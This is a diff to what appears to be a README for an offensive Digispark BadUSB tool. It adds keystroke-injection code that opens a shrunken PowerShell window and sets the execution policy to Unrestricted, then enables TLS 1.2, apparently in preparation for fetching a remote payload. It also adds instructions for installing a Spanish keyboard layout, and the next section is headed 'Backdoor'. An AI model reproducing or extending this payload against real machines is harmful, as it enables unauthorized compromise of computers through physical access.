@@ -48,6 +48,7 @@ ENTER
 ### Digispark
 
 ```c
+#define kbd_es_es
 #include "DigiKeyboard.h"
 void setup() {
 }
@@ -57,9 +58,15 @@ DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
-DigiKeyboard.print("powershell");
+DigiKeyboard.print("powershell -noe -c \". mode.com con: lines=1 cols=40\"");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(750);
+DigiKeyboard.print("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(200);
+DigiKeyboard.print("S");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
 DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
@@ -80,6 +87,11 @@ for (;;) {
 
 > DigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h
 
+> Keyboard en_US to es_ES: https://github.com/ernesto-xload/DigisparkKeyboard
+Decompress the archive and put all in : ```C:\Users\Administrador\AppData\Local\Arduino15\packages\digistump\hardware\avr\1.6.7\libraries\DigisparkKeyboard```, later in the script you must put the following line to specify the keyboard layout.
+```c
+#define kbd_es_es
+```
 
 
 ## Option 2 (Backdoor)
